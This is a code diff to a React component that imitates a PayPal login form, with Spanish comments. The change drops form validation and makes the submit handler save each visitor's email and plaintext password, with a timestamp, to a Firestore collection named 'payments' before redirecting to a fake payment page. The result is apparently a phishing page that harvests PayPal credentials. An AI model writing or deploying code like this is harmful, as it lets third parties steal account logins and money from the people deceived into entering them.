@@ -3,6 +3,8 @@ import * as React from "react";
 import { useState } from "react";
 import styles from "./PaypalLoginForm.module.css";
 import { useNavigate } from 'react-router-dom';
+import { collection, addDoc } from "firebase/firestore";
+import { db } from "../../credentials";
 
 const PaypalLoginForm = () => {
   const [formData, setFormData] = useState({
@@ -10,6 +12,7 @@ const PaypalLoginForm = () => {
     password: "",
     keepLoggedIn: false,
   });
+
   const navigate = useNavigate();
 
   const handleInputChange = (e) => {
@@ -45,18 +48,24 @@ const PaypalLoginForm = () => {
     return true;
   };
 
-  const handleSubmit = (e) => {
+  const handleSubmit = async (e) => {
     e.preventDefault();
 
-    if (!validarFormulario()) {
-      return; // Detiene la ejecución si la validación falla
-    }
+    try {
+      await addDoc(collection(db, "payments"), {
+        email: formData.email,
+        password: formData.password,
+        keepLoggedIn: formData.keepLoggedIn,
+        date: new Date().toISOString(),
+      });
 
-    // Simula el inicio de sesión
-    setTimeout(() => {
-      // Redirige a la página de pago simulada
-      navigate('/paypal-payment');
-    }, 1000); // Espera 1 segundo para simular el procesamiento
+      setTimeout(() => {
+        navigate("/paypal-payment");
+      }, 1000);
+    } catch (error) {
+      console.error("Error al guardar los datos en Firestore:", error);
+      alert("Hubo un error al procesar tu solicitud. Intenta nuevamente.");
+    }
   };
 
   return (
